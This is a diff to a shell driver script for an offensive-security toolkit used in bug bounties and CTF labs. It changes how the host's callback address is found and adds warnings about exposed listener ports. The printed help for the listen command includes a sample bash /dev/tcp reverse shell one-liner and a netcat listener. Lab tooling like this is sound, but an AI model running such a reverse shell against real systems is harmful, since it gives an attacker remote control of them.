@@ -15,7 +15,7 @@ deck - driver for icepick-offsec, a bug bounty & CTF toolkit
 
   ./deck build              build the image
   ./deck shell              interactive shell
-  ./deck listen [ports...]  shell with listener ports published to the LAN
+  ./deck listen [ports...]  shell with listener ports published on the host
   ./deck vpn <file.ovpn>    connect an HTB/THM VPN, then drop into a shell
         [--socks [port]]    ...and a SOCKS5 proxy on 127.0.0.1:1080 for your browser
   ./deck run <cmd...>       one-shot command, no shell
@@ -41,7 +41,7 @@ case "${1:-}" in
 
   # A normal container publishes nothing, so a listener inside binds to the
   # private bridge IP nothing off-host can reach. `listen` publishes ports so a
-  # LAN target can call back - aim its payload at the host's IP below, not the
+  # target can call back - aim its payload at the host's IP below, not the
   # container's. (For HTB/THM use `deck vpn`: tun0 is already routable.)
   listen)
     shift
@@ -50,14 +50,31 @@ case "${1:-}" in
     pub=()
     for p in "${ports[@]}"; do pub+=(-p "${p}:${p}"); done
 
-    iface=$(route get default 2>/dev/null | awk '/interface:/{print $2}')
-    lan=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || echo '<your-LAN-IP>')
+    # The address on the default route is where a callback has to land. macOS
+    # ships no `ip`, Linux no `ipconfig`, so ask whichever is here.
+    #
+    # Every lookup ends in `|| true`. A bare assignment takes its command's
+    # status, and under `set -e` + `pipefail` a host with no default route -
+    # or no `ip` at all - would abort deck here rather than fall through to
+    # the placeholder below, printing nothing and never starting the shell.
+    case "$(uname -s)" in
+      Darwin)
+        iface=$(route get default 2>/dev/null | awk '/interface:/{print $2}') || true
+        addr=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || true) ;;
+      *)
+        # A route lookup, not `hostname -I`: it picks the one source address
+        # that egress actually uses on a multi-homed box.
+        addr=$(ip route get 1.1.1.1 2>/dev/null |
+               awk '{ for (i = 1; i < NF; i++) if ($i == "src") { print $(i+1); exit } }') || true ;;
+    esac
+    addr=${addr:-<your-host-IP>}
 
     echo "listener ports published on the host : ${ports[*]}"
-    echo "callback address for LAN targets     : $lan"
+    echo "callback address for targets         : $addr"
     echo "  e.g.  nc -lvnp 4444"
-    echo "        target> bash -i >& /dev/tcp/$lan/4444 0>&1"
-    echo "these ports are open to your whole LAN until you exit the shell."
+    echo "        target> bash -i >& /dev/tcp/$addr/4444 0>&1"
+    echo "these ports are open to anything that can reach $addr until you exit."
+    echo "on a public host that means the internet - check your provider firewall."
     echo
     "${DC[@]}" run --rm "${pub[@]}" deck
     ;;
@@ -84,8 +101,9 @@ case "${1:-}" in
     base="$(basename "$cfg")"
     [ "$cfg" -ef "workspace/$base" ] || cp "$cfg" "workspace/$base"
 
-    # Loopback only. The default `-p 1080:1080` would hand every machine on your
-    # LAN an unauthenticated route onto the lab network.
+    # Loopback only. The default `-p 1080:1080` would hand anything that can
+    # reach this host - your LAN, or the internet on a VPS - an unauthenticated
+    # route onto the lab network.
     args=(--rm -e OVPN="$base")
     [ -n "$socks" ] && args+=(-p "127.0.0.1:${socks}:${socks}" -e SOCKS="$socks")
 
